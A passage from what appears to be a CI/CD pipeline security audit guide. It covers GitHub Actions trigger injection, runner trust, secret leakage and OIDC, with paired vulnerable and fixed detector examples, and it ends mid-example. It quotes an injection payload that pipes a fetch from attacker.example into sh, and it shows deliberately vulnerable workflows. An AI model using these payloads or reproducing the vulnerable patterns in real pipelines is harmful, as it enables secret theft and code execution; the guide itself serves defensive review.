**Four of these sweeps hit the *prescribed fix* as often as the defect, and no hit from any of them is a finding on its own.** The unanchored `${{ github.event…` alternatives match a value bound under `env:`, which is item 1d's mitigation; `include-hidden-files` matches both the dangerous `true` and an explicit `false`; the `^ *env:` scope sweep deliberately enumerates step-scoped bindings, which *are* the fix, because column count cannot tell them from job-scoped ones; and the shell-level fail-open sweep matches a correctly `--fail`-guarded `curl` exactly as readily as an unguarded one. Read the value, the position and the flags, then decide. A sweep that only ever printed defects would be a sweep that had guessed the answer.

### 1. Privileged triggers, untrusted content and expression injection (`workflow-trigger-and-script-injection`)

The highest-consequence class in this lens, and the one where the *detection rule* is easiest to get wrong.

**1a. The privileged-trigger pattern, detected structurally.** This class is usually written up under a research label, and that label never appears in vulnerable code. **Do not grep the repository for `pwn-request`** — it is a research term for the class, not a string any workflow contains, and a grep for it returns nothing on a fully vulnerable repository. Detect from structure, in two legs:

1. **A privileged trigger:** `pull_request_target`, `workflow_run`, `issue_comment`, `issues`, `discussion_comment`, `pull_request_review_comment`. Each runs in the base repository's context with its secrets and its token, and each can be started by a user with no write access.
2. **Untrusted content checked out or executed under it.** Checkout of `${{ github.event.pull_request.head.sha }}`, `head.ref`, `${{ github.event.workflow_run.head_sha }}`, `refs/pull/${{ github.event.issue.number }}/merge`, a bare `gh pr checkout`, `git fetch origin pull/N/head` — or execution of pull-request-controlled content without an explicit checkout, via a `uses: ./…` local action resolved out of a workspace that holds PR code, or interpolation of PR text into `run:`.

**Both legs together are the finding.** An explicit `secrets.*` reference is **not** a required third leg, and treating it as one is the mistake that silently clears the canonical case: `pull_request_target` plus a checkout of the PR head plus `npm ci` names no secret anywhere and is nonetheless a full compromise of the token and of every secret the job can see. Two reasons the privilege leg is already satisfied structurally — the base-context token is in the environment of every step whether the YAML mentions it or not, and `actions/checkout` **defaults `persist-credentials` to true**, writing that token into `.git/config` where any subsequently executed PR code can read it. Treat `secrets.*`, `id-token: write`, a write-scoped `permissions:` block and `persist-credentials: true` as **aggravators that raise severity**, never as preconditions for the finding.

Tools that encode this rule structurally, and are worth naming in the report: **`zizmor`** and **`actionlint`** for GitHub Actions workflows, **`poutine`** and **`octoscan`** for multi-provider and deeper dataflow analysis. Running one of them is a legitimate substitute for the manual sweep. Grepping for the research label is not.

```detector
match: |
  # .github/workflows/pr-check.yml
  name: PR check
  on:
    pull_request_target:
      types: [opened, synchronize, reopened]
  jobs:
    build:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
          with:
            node-version: 20
        - run: npm ci
        - run: npm run lint
nomatch: |
  # .github/workflows/pr-check.yml
  name: PR check
  on:
    pull_request:
      types: [opened, synchronize, reopened]
  jobs:
    build:
      runs-on: ubuntu-latest
      permissions:
        contents: read
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
          with:
            persist-credentials: false
        - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
          with:
            node-version: 20
        - run: npm ci
        - run: npm run lint
```

The two files differ in one word at the top and one `with:` key. That is the whole finding, and it is why the trigger line is the first thing to read in any workflow.

**1b. The `workflow_run` class.** `workflow_run` fires *after* another workflow completes and runs in the base context with full privilege — including when the run it followed was an untrusted fork pull request. Three shapes:

- **Artifact poisoning.** The privileged workflow downloads an artifact the untrusted run produced, then unpacks and *uses* it: reads a pull-request number out of it and comments, unzips it into the workspace and builds, or executes a script from it. Everything inside that archive is attacker-controlled. `actions/download-artifact` in a `workflow_run` job is the anchor; a third-party download action or a raw `gh run download` is the same thing.
- **Interpolation of `workflow_run` metadata.** `github.event.workflow_run.head_branch`, `head_commit.message`, `head_repository.description` and `display_title` are attacker-controlled for a fork run and are frequently interpolated into `run:` to post a status.
- **Checkout of `head_sha`.** Item 1a with a different context path.

```detector
match: |
  # .github/workflows/pr-comment.yml
  on:
    workflow_run:
      workflows: [PR check]
      types: [completed]
  jobs:
    comment:
      runs-on: ubuntu-latest
      permissions:
        pull-requests: write
      steps:
        - uses: actions/download-artifact@fa0a91b85d4f404e444e00e005971372dc801d16 # v4.1.8
          with:
            run-id: ${{ github.event.workflow_run.id }}
            github-token: ${{ secrets.GITHUB_TOKEN }}
        - run: |
            PR=$(cat pr_number/number.txt)
            gh pr comment "$PR" --body "Build for ${{ github.event.workflow_run.head_branch }} finished"
          env:
            GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
nomatch: |
  # .github/workflows/pr-comment.yml
  on:
    workflow_run:
      workflows: [PR check]
      types: [completed]
  jobs:
    comment:
      runs-on: ubuntu-latest
      permissions:
        pull-requests: write
      steps:
        - name: Resolve the PR from the API, not from the artifact
          run: |
            PR=$(gh api "repos/$GITHUB_REPOSITORY/commits/$HEAD_SHA/pulls" --jq '.[0].number')
            [ -n "$PR" ] || exit 1
            gh pr comment "$PR" --body "Build for $HEAD_BRANCH finished"
          env:
            GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
            HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
            HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
```

In the `match` half, `$PR` comes out of the attacker's archive and `head_branch` is interpolated directly into the script text. The `nomatch` half derives the number from the API using the immutable SHA and passes both values through `env:`.

**1c. The comment and issue trigger class.** `issue_comment` fires on issues *and* pull requests; `github.event.issue.pull_request` is how you tell which. The ChatOps shape — a `/deploy`, `/retest` or `/ok-to-test` command — carries two defects that travel together:

- **The comment body reaches a shell.** `${{ github.event.comment.body }}` interpolated into `run:`, or parsed by a shell command built from it.
- **The author gate is missing or wrong.** What matters is the commenter's association with the repository: `github.event.comment.author_association` in `OWNER`, `MEMBER` or `COLLABORATOR`, or an explicit permission lookup through the API. A check on `github.actor` is not an author gate on this trigger, and a `contains()` over a hand-maintained name list is not one either. Grep for the **absence** of any association or permission check in a job this trigger can reach that also holds a secret.

Then the checkout leg: a `/retest` handler that checks out `refs/pull/${{ github.event.issue.number }}/merge` is item 1a again, reachable by anyone who can type a comment.

```detector
match: |
  # .github/workflows/chatops.yml
  on:
    issue_comment:
      types: [created]
  jobs:
    retest:
      if: startsWith(github.event.comment.body, '/retest')
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
          with:
            ref: refs/pull/${{ github.event.issue.number }}/merge
        - run: make integration-test
          env:
            STAGING_API_KEY: ${{ secrets.STAGING_API_KEY }}
nomatch: |
  # .github/workflows/chatops.yml
  on:
    issue_comment:
      types: [created]
  jobs:
    retest:
      if: |
        github.event.issue.pull_request &&
        startsWith(github.event.comment.body, '/retest') &&
        contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
          with:
            ref: refs/pull/${{ github.event.issue.number }}/merge
        - run: make integration-test
          env:
            STAGING_API_KEY: ${{ secrets.STAGING_API_KEY }}
```

The `nomatch` half is not *safe*. It still runs pull-request code with a secret, for anyone the repository already trusts. It is the narrower finding — an author gate exists, so the exposure is to collaborators rather than to the internet. Write it that way; do not clear it.

**1d. Expression injection into `run:`.** Workflow expressions are substituted into the script text before the shell runs, so a value containing `"; curl https://attacker.example/s | sh #` executes. The mitigation is to pass the value through `env:` and reference it as a quoted shell variable:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"
```

A **step-scoped** `env:` — one written on the step that consumes it, as above — is therefore the *prescribed fix*, and a secret or a context value bound there can never itself be cited as the exposure. Two consequences, stated so they are not filed as findings: `${{ secrets.X }}` written inline in a `run:` string is a masking and quoting nit, not an injection; and `${{ … }}` inside an `if:` condition is evaluated by the expression engine rather than by a shell, so it is a logic question, not a command-injection one.

**Read the binding's *parent key* before applying that clearance, because scope is the whole difference — and do not read it off the column count.** Four-space YAML is legal and common, and it puts a job-level `env:` at column 8, exactly where a two-space file puts a step-level one; a rule keyed on indentation width therefore clears the finding in half of all repositories. What tells them apart is what encloses the block: a step-scoped `env:` is a sibling of the `run:` or `uses:` it serves, inside an item of the `steps:` sequence. A workflow-level or job-level `env:` block puts the value in the environment of *every* step in that scope — including a step that installs or executes untrusted pull-request content, where a `postinstall` script, a build plugin or a `Makefile` target reads it straight out of `process.env` / `os.environ` without the workflow ever naming it again. A secret bound at workflow or job scope in a file that builds untrusted content is a real exposure and is graded as `ci-secret-and-token-handling` (item 3), not cleared. The clearance covers the step-scoped binding only.

The injectable set is small and worth memorising, because grading every `${{ }}` as injection produces a report nobody reads.

- **Genuinely attacker-controlled:** `*.title`, `*.body`, `*_comment.body`, `github.head_ref` and `pull_request.head.ref` (git refs permit `;`, `$`, backticks, `&`, `|`, parentheses and quote characters), commit messages and commit author names, `label.name`, `pull_request.head.repo.*` including `description` and `homepage`, `github.event.workflow_run.head_branch` / `head_commit.message` / `head_repository.*` / `display_title`, `github.event.review.body`, `github.event.discussion.title` and `body`, and free-text `workflow_dispatch` inputs.
- **Constrained, and not an injection source:** `github.sha`, `github.run_id`, `github.run_number`, `github.repository`, `github.repository_owner`, `github.actor`, `github.job`, `github.workflow`, `github.event.number` / `github.event.pull_request.number`, `vars.*`, and `workflow_dispatch` inputs typed `choice` or `boolean`. Usernames and repository names cannot carry shell metacharacters, SHAs and IDs are hex or numeric, and the provider validates a `choice` value against its declared options.

That second list clears those contexts **for interpolation only.** `github.actor` is safe to substitute into a script *and is not an authorization control* — a job gated on `github.actor == 'some-bot'` is a separate question about trust decisions and is not cleared here.

```detector
match: |
  # .github/workflows/label.yml
  on:
    pull_request_target:
      types: [opened, edited]
  jobs:
    size:
      runs-on: ubuntu-latest
      steps:
        - run: |
            echo "Title: ${{ github.event.pull_request.title }}"
            if [[ "${{ github.event.pull_request.title }}" == *"[skip ci]"* ]]; then
              echo "skipping"
            fi
nomatch: |
  # .github/workflows/label.yml
  on:
    pull_request_target:
      types: [opened, edited]
  jobs:
    size:
      runs-on: ubuntu-latest
      steps:
        - env:
            PR_TITLE: ${{ github.event.pull_request.title }}
          run: |
            echo "Title: $PR_TITLE"
            if [[ "$PR_TITLE" == *"[skip ci]"* ]]; then
              echo "skipping"
            fi
```

**1e. `$GITHUB_ENV`, `$GITHUB_OUTPUT` and `$GITHUB_PATH` injection.** These three files are the runner's workflow-command channel, and appending untrusted text to any of them is a second, much less watched injection path. It survives review because the value is written with a plain `echo` that looks like ordinary data handling.

- **`$GITHUB_ENV`** sets environment variables for every subsequent step. An untrusted value containing a newline injects additional assignments — `NODE_OPTIONS=--require=/tmp/x.js`, `LD_PRELOAD`, `PATH`, `BUNDLE_GEMFILE` — converting a benign later step into code execution. The multi-line heredoc form (`echo "BODY<<EOF" >> "$GITHUB_ENV"`) is worse rather than better: an attacker who includes the delimiter in the value escapes the block.
- **`$GITHUB_OUTPUT`** does the same for `steps.<id>.outputs.<name>`, and the payload lands wherever a downstream job interpolates that output — very often straight into a `run:` block, turning a data-flow bug into command execution one job later.
- **`$GITHUB_PATH`** prepends a directory to `PATH`. An attacker-chosen directory holding a `node` or `python` shim hijacks every later step.
- **`ACTIONS_ALLOW_UNSECURE_COMMANDS`** re-enables the deprecated stdout-based `set-env` and `add-path` workflow commands (deprecated in **2020**, advisory `CVE-2020-15228`), under which *any logged line* can set an environment variable — including a line of untrusted content echoed by a build tool. Its presence is a finding on its own; grep for it by name.

The rule: never write attacker-influenced text into these files. Where a value must cross a step boundary, sanitize it to a known character set first, or keep it in `env:` and never re-emit it.

```detector
match: |
  # .github/workflows/release-notes.yml
  - name: Collect metadata
    run: |
      echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV
      echo "SUBJECT=$(git log -1 --pretty=%s)" >> $GITHUB_ENV
  - name: Announce
    run: ./scripts/announce.sh "$BRANCH" "$SUBJECT"
nomatch: |
  # .github/workflows/release-notes.yml
  - name: Collect metadata
    env:
      RAW_BRANCH: ${{ github.head_ref }}
    run: |
      printf 'BRANCH=%s\n' "$(printf '%s' "$RAW_BRANCH" | tr -cd 'A-Za-z0-9._/-')" >> "$GITHUB_ENV"
  - name: Announce
    env:
      SUBJECT: ${{ github.event.head_commit.message }}
    run: ./scripts/announce.sh "$BRANCH" "$SUBJECT"
```

Both lines of the `match` half are defective, for different reasons: `github.head_ref` is interpolated, and the commit subject is captured by a command substitution and appended raw, so a commit message containing a newline injects an arbitrary assignment. The second one is the shape that gets missed, because no `${{ }}` appears on the line.

**1f. The same defect on other providers.** The mechanism is textual substitution before execution, and every provider has it.

- **GitLab CI** — `$CI_MERGE_REQUEST_TITLE`, `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, `$CI_COMMIT_MESSAGE` and `$CI_COMMIT_DESCRIPTION` expanded inside `script:`. Merge-request pipelines are also where `CI_PIPELINE_SOURCE` gating lives: `rules: if: $CI_PIPELINE_SOURCE == "merge_request_event"` is a trigger classifier, not a trust boundary, and protected variables are exposed only on protected refs — which is why a job that needs a secret *and* runs on a merge request is worth reading twice.
- **Jenkins** — Groovy interpolates `"${params.BRANCH}"` and `"${env.CHANGE_BRANCH}"` *before* the string reaches `sh`. The single-quoted form plus an `environment` binding is the fix, and the difference between `sh "…"` and `sh '…'` is the whole bug.

```detector
match: |
  // Jenkinsfile
  pipeline {
    agent any
    parameters { string(name: 'BRANCH', defaultValue: 'main') }
    stages {
      stage('Build') {
        steps {
          sh "git checkout ${params.BRANCH} && make build"
        }
      }
    }
  }
nomatch: |
  // Jenkinsfile
  pipeline {
    agent { label 'build-ephemeral' }
    parameters { string(name: 'BRANCH', defaultValue: 'main') }
    environment { BRANCH = "${params.BRANCH}" }
    stages {
      stage('Build') {
        steps {
          sh 'git checkout -- "$BRANCH" && make build'
        }
      }
    }
  }
```

```detector
match: |
  # .gitlab-ci.yml
  mr-preview:
    stage: test
    rules:
      - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    script:
      - echo "Building $CI_MERGE_REQUEST_TITLE"
      - ./deploy-preview.sh --name "$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME"
    variables:
      PREVIEW_TOKEN: $STAGING_DEPLOY_TOKEN
nomatch: |
  # .gitlab-ci.yml
  mr-preview:
    stage: test
    rules:
      - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    script:
      - printf 'Building %s\n' "$CI_MERGE_REQUEST_TITLE"
      - ./deploy-preview.sh --name "$(printf '%s' "$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME" | tr -cd 'a-z0-9-')"
```

### 2. Runner and build-environment trust (`runner-and-build-environment-trust`)

What the build runs on, and what else is reachable from there.

- **Self-hosted runners reachable by untrusted pull requests.** On a public repository this is remote code execution by anyone who can open a pull request, and the provider documents it as unsupported. The finding is not the label; it is the label *plus* what the runner is. Establish these, and write down which you could not: ephemeral or just-in-time, or a persistent machine? Does it hold cloud credentials, a Docker socket, a shared toolcache, a package cache, or a checkout of another repository? Is the repository public, and is fork-pull-request approval required? A persistent runner an arbitrary fork pull request can reach is the top of this lens's severity table; an ephemeral single-use container is a Medium hygiene finding about drift.
- **The host Docker socket.** `/var/run/docker.sock` mounted into a job, or `docker:dind` with `privileged: true`, is container escape by design: any step can start a container with the host filesystem mounted. Check `options:` on a workflow `container:`, `volumes:` in any runner configuration committed to the repository, and `-v /var/run/docker.sock` anywhere in a build script. Where the build genuinely must produce images, a daemonless or rootless builder is the alternative to name.
- **Container job images that are not digest-pinned.** `container: image: node:20` resolves to whatever that tag points at today. This is the pipeline's own reference, so it is graded here as a mutable reference (item 5) rather than as image content.
- **Bootstrap-by-download.** A pipe from `curl` or `wget` into a shell, and any unpinned installer fetched at build time, executes code the repository does not contain. This is *not* automatically a finding: pinned to a version or digest, checksum- or signature-verified, and run in an ephemeral container, it has the same trust structure as an official setup action or a distribution package. The discriminators that make it one — the URL points at `latest`, `main` or an unversioned installer path; no checksum, digest or signature is verified; secrets are present in the environment during the fetch; and the pipeline has no `set -o pipefail`, so a truncated download can partially execute and still report success. The **Codecov (2021)** compromise is the illustration: a bash uploader script fetched at build time was modified upstream and exfiltrated environment variables from every CI that ran it. The lesson is pinning by hash plus restricting egress from CI, not distrusting `curl`.
- **Caches and artifacts as an inbound channel.** A restored cache is code the build trusts. Two questions: *who could have written it*, and *what does the build do with it*. Cached `node_modules`, `~/.cargo/bin`, `~/.local/bin`, a compiled toolchain or a build-output directory are all executed later, so a poisoned entry is code execution in whatever job restores it. The restore key is the control surface: a key composed entirely of repository-controlled inputs (a lockfile hash, the runner OS) is tight, while `restore-keys:` prefix fallback and any key component derived from a branch name, a pull-request title or a workflow input widens the set of entries a privileged job will accept. Grade the composition of the key and the sensitivity of the restoring job — a cache restored into a release or deploy job is the case that matters. Do not assert or deny cross-branch reachability from the workflow file alone: cache scoping is provider behaviour, it belongs in the assumptions list, and the finding stands on key composition plus what the restored content is used for.
- **Artifacts crossing a trust boundary** are the same problem with a different verb, and are graded under `workflow_run` in item 1b.
- **The runner's own filesystem.** A build that writes outside the workspace — `/usr/local/bin`, `~/.ssh`, `~/.docker` — on a persistent runner leaves it there for the next job, including the next repository's job.

```detector
match: |
  # .github/workflows/ci.yml
  on: [pull_request]
  jobs:
    test:
      runs-on: [self-hosted, linux, x64]
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        - run: make test
nomatch: |
  # .github/workflows/ci.yml
  on: [pull_request]
  jobs:
    test:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        - run: make test
```

```detector
match: |
  # .gitlab-ci.yml
  build-image:
    image: docker:24.0
    services:
      - name: docker:24.0-dind
        command: ["--host=tcp://0.0.0.0:2375"]
    variables:
      DOCKER_HOST: tcp://docker:2375
      DOCKER_TLS_CERTDIR: ""
    script:
      - docker build -t "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA" .
      - docker push "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA"
nomatch: |
  # .gitlab-ci.yml
  build-image:
    image:
      name: example.registry/build/kaniko@sha256:6f2d1c0b8a7e4d3c2b1a09f8e7d6c5b4a39281706f5e4d3c2b1a0918273645ab
      entrypoint: [""]
    script:
      - /kaniko/executor --context "$CI_PROJECT_DIR" --destination "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA"
```

```detector
match: |
  # .github/workflows/release.yml
  - name: Install release tooling
    run: curl -fsSL https://get.example.dev/install.sh | sh
  - name: Publish
    run: example-cli publish
    env:
      EXAMPLE_TOKEN: ${{ secrets.EXAMPLE_TOKEN }}
nomatch: |
  # .github/workflows/release.yml
  - name: Install release tooling
    run: |
      set -euo pipefail
      curl -fsSL -o install.sh "https://get.example.dev/v2.4.1/install.sh"
      echo "9f2b1c0d4e5a6b7c8d9e0f1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e  install.sh" | sha256sum -c -
      sh ./install.sh
  - name: Publish
    run: example-cli publish
    env:
      EXAMPLE_TOKEN: ${{ secrets.EXAMPLE_TOKEN }}
```

```detector
match: |
  # .github/workflows/release.yml
  jobs:
    publish:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/cache@1bd1e32a3bdc45362d1e726936510720a7c30a57 # v4.2.0
          with:
            path: node_modules
            key: deps-${{ github.head_ref }}
            restore-keys: |
              deps-
        - run: npm run build && npm publish
nomatch: |
  # .github/workflows/release.yml
  jobs:
    publish:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/cache@1bd1e32a3bdc45362d1e726936510720a7c30a57 # v4.2.0
          with:
            path: ~/.npm
            key: npm-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
        - run: npm ci --ignore-scripts && npm run build && npm publish
```

The cache pair is worth reading closely. `path: node_modules` restores executable code; `path: ~/.npm` restores a download cache whose entries are integrity-checked against the lockfile on install. The key in the `match` half is derived from a branch name and falls back to any `deps-` prefix; the key in the `nomatch` half is a lockfile hash with no fallback.

### 3. CI secret and token handling (`ci-secret-and-token-handling`)

Providers mask registered secret values in logs on a best-effort, exact-string basis. Every item here is a way around that, and none of them can be cleared by "the platform masks secrets" — masking is provider behaviour this audit cannot verify, and every transform below defeats it by construction.

- **Direct disclosure.** `echo "$SECRET"`, `set -x` in a script that handles one (it prints every expanded command), `env`, `printenv` or `export -p` dumps in a debug step, and `--verbose`/`--debug` flags on a CLI that echoes its own configuration.
- **Transforms that break masking.** `base64`, `xxd`, JSON serialization, URL-encoding, `jq` reformatting, `tr`, splitting a value across lines, and interpolating a secret into a longer string. The masker matches the registered literal; the derived encoding is a different literal and prints in full. This is the highest-yield grep in the item: search for `base64`, `jq`, `xxd` and `openssl enc` in the same step as a secret reference.
- **Over-broad artifact paths — and read the action's version before asserting the mechanism.** An upload step with `path: .` uploads the whole workspace, but **`actions/upload-artifact` v4.4.0 (September 2024) added `include-hidden-files`, defaulting to `false`**. From that version on, the dot-prefixed files everyone reaches for — `.git/config` (which carries the persisted token), `.npmrc`, `.docker/config.json`, `.env` — are **excluded by default**, so "`path: .` sweeps up `.git/config`" is a claim a platform engineer rebuts with one link, and the report loses the room. Cite one of these instead:
  - **`include-hidden-files: true`** on a step whose path is broader than the build output — this is the finding, and it is a one-line grep;
  - an action version **older than v4.4.0** (read the pin's comment, the tag, or a `@v3` ref), where hidden files were included;
  - a **non-hidden** credential inside the uploaded tree, which the default never protected: `*.pem`, `*.key`, `id_rsa`, `credentials.json`, `kubeconfig`, `settings.xml`, a service-account JSON, or an `.npmrc` the build wrote to a non-hidden path;
  - a provider with **no such default** — GitLab `artifacts: paths: ["."]`, CircleCI `store_artifacts`, Buildkite `artifact_paths`, Azure `PublishBuildArtifacts` — where the original claim holds unchanged.

  Where the path is broad and none of the four is established, that is the assumption-with-verification-step form (which version resolves at run time, and what the tree actually contains), not a Critical.
- **Over-broad cache paths.** The same list, plus `~/.gradle/gradle.properties`, `~/.m2/settings.xml`, `~/.aws` and `~/.config/gh`. **`actions/cache` has no hidden-file exclusion**, so here the dot-prefixed reasoning does hold as written: a cache path that covers a credential file captures it. A cached credential file is also a *durable* leak: it outlives the run.
- **Secrets written to the workspace.** A step that materializes a key or an `.npmrc` into the checkout directory leaves it readable by every later step in the job — including a step that runs untrusted code, and including the artifact upload above. Prefer the provider's own injection; where a file is unavoidable, write it outside the workspace and remove it in a step that runs unconditionally.
- **A secret bound at workflow or job scope in a file that executes untrusted content.** This is the one `env:` case that *is* an exposure, and item 1d's "`env:` is the prescribed fix" clearance does not reach it. A `env:` block at the top of the file, or under `jobs.<id>:` rather than under a step, is in the environment of every step in scope. Add a step that installs or builds pull-request content — `npm ci`, `pip install -e .`, `make`, a linter that loads plugins from the PR's config — and a lifecycle script reads the value out of the process environment with no workflow expression involved and nothing in the log to grep for. The finding is the pair: the block's parent key — quote it, and never infer it from the column count, because four-space YAML puts a job-level `env:` at the same column as a two-space file's step-level one — and the untrusted-content step in scope. The fix is to move the binding onto the single step that needs it, or into a separate job that does not check out PR content.
- **`persist-credentials`.** `actions/checkout` writes the job's token into `.git/config` unless told not to. On any job that subsequently executes third-party or pull-request-controlled code, `persist-credentials: false` is the control and its absence is the finding.
- **Over-provisioned reusable-workflow calls.** `secrets: inherit` hands the callee every secret the caller can see. Name the secrets the callee needs.
- **GitLab specifics.** A variable's *Protected* flag limits it to protected refs and its *Masked* flag hides it in logs, and masking imposes constraints on the value — length, character set, no newlines — that a non-conforming secret silently fails, so a "masked" variable holding a multi-line PEM is not masked at all. Both flags are project settings rather than repository files, so report them as questions unless the repository commits an infrastructure-as-code definition of its variables. `CI_JOB_TOKEN`'s cross-project access scope is likewise a project setting.
- **Secrets already in history.** `.gitignore` prevents future commits and does nothing about past ones, and **`.gitattributes` has no role in excluding files from a commit at all** — it controls end-of-line normalization, diff and merge drivers, filters, and `export-ignore` for archives. Only `.gitignore`, `.git/info/exclude` and `core.excludesFile` affect staging. So never accept a `.gitignore` entry as evidence that a secret was not committed: audit history with `git log --all --full-history -- '*.pem' '*.key' '.env'` and run a secret scanner over the full history rather than the working tree. Pre-commit hooks configured in `.pre-commit-config.yaml` are bypassable with `--no-verify` and must be paired with a server-side or pipeline-side scan. A credential literal *found* in the repository is `hardcoded-credentials-and-key-material` and belongs to the crypto lens — hand it over with the file and line; what stays here is the absence of a history-scanning control.

```detector
match: |
  # .github/workflows/ci.yml
  - name: Upload build output
    uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882 # v4.4.3
    with:
      name: build
      path: .
      include-hidden-files: true
nomatch: |
  # .github/workflows/ci.yml
  - name: Upload build output
    uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882 # v4.4.3
    with:
      name: build
      path: dist/
```

The `match` half needs both lines to be a finding at this pinned version, and that is the point of the pair: on v4.4.0 and later `path: .` alone leaves `.git/config` and `.npmrc` behind, while `include-hidden-files: true` puts them back. The same workspace uploaded by a `@v3` ref, or a `path: build/` tree containing `deploy-key.pem`, is the same Critical without the second line.

```detector
match: |
  # .github/workflows/pr-build.yml
  on:
    pull_request_target:
      types: [opened, synchronize]
  env:
    SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
  jobs:
    build:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        - run: npm ci
nomatch: |
  # .github/workflows/pr-build.yml
  on:
    pull_request_target:
      types: [opened, synchronize]
  jobs:
    build:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
          with:
            ref: ${{ github.event.pull_request.head.sha }}
            persist-credentials: false
        - run: npm ci --ignore-scripts
        - name: Upload the source map, in a step that never sees PR code
          run: ./scripts/upload-sourcemaps.sh
          env:
            SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
```

Neither half of that pair is *safe* — both check out pull-request code under `pull_request_target`, which is row 1's Critical on its own. What the pair isolates is the `env:` scope question layered on top: in the `match` half a lifecycle script run by `npm ci` reads `SENTRY_AUTH_TOKEN` out of its own process environment, and no expression, no log line and no `secrets.` reference appears anywhere near the install. Moving the binding onto the one step that needs it is what the `nomatch` half does.

```detector
match: |
  # scripts/deploy.sh
  #!/usr/bin/env bash
  set -euxo pipefail
  AUTH=$(printf '%s:%s' "$REGISTRY_USER" "$REGISTRY_TOKEN" | base64)
  curl -sS -H "Authorization: Basic ${AUTH}" -X POST "$REGISTRY_URL/deploy"
nomatch: |
  # scripts/deploy.sh
  #!/usr/bin/env bash
  set -euo pipefail
  curl -sS --user "$REGISTRY_USER:$REGISTRY_TOKEN" -X POST "$REGISTRY_URL/deploy"
```

`set -x` prints the `printf` line with both values expanded, and the base64 of the token is a string the masker has never seen. Dropping the `x` and letting the client consume the credential from its own flag leaves nothing derived in the log.

```detector
match: |
  # .github/workflows/publish.yml
  jobs:
    publish:
      uses: ./.github/workflows/reusable-publish.yml
      secrets: inherit
nomatch: |
  # .github/workflows/publish.yml
  jobs:
    publish:
      uses: ./.github/workflows/reusable-publish.yml
      secrets:
        NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### 4. Workload identity in the pipeline (`ci-oidc-workflow-configuration`)

Federated short-lived credentials replace long-lived cloud keys held as CI secrets. This lens owns the pipeline half only; the trust policy on the cloud side is `cloud-oidc-trust-policy` in **cloud-and-iac**, and a finding about a wildcarded subject condition goes there with the file and line.

- **Long-lived cloud keys where federation is available.** An access-key pair in `secrets.AWS_ACCESS_KEY_ID` / `secrets.AWS_SECRET_ACCESS_KEY`, a service-account JSON blob in a secret, an application client secret. These do not rotate, they work from anywhere, and their compromise is not bounded by a run. The finding is findable: the credential-configuring step is in the workflow file, and so is the absence of `id-token: write`.
- **`id-token: write` declared at workflow level.** Token-minting permission belongs on the single job that needs it. Declared at the top of the file, every job in it — including one that builds untrusted pull-request content — can mint a cloud credential.
- **What the workflow asks for.** An explicit `audience:`, and a role reference that names one role per environment rather than one role for everything. Where the same role is assumed by both the pull-request job and the deploy job, say so: the only gate between environments is then the workflow's `if:`.
- **Trusted publishing to package registries** is the same pattern aimed at registries, and is graded under item 12, because there the interesting question is what it does and does not attest.

```detector
match: |
  # .github/workflows/deploy.yml
  jobs:
    deploy:
      runs-on: ubuntu-24.04
      steps:
        - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
          with:
            aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
            aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
            aws-region: us-east-1
        - run: aws s3 sync ./dist s3://example-assets
nomatch: |
  # .github/workflows/deploy.yml
  jobs:
    deploy:
      runs-on: ubuntu-24.04
      permissions:
        id-token: write
        contents: read
      steps:
        - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
          with:
            role-to-assume: arn:aws:iam::111122223333:role/deploy-assets
            aws-region: us-east-1
        - run: aws s3 sync ./dist s3://example-assets
```

```detector
match: |
  # .github/workflows/build.yml
  permissions:
    contents: read
    id-token: write
  jobs:
    pr-build:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        - run: make build
    publish:
      needs: pr-build
      runs-on: ubuntu-24.04
      steps:
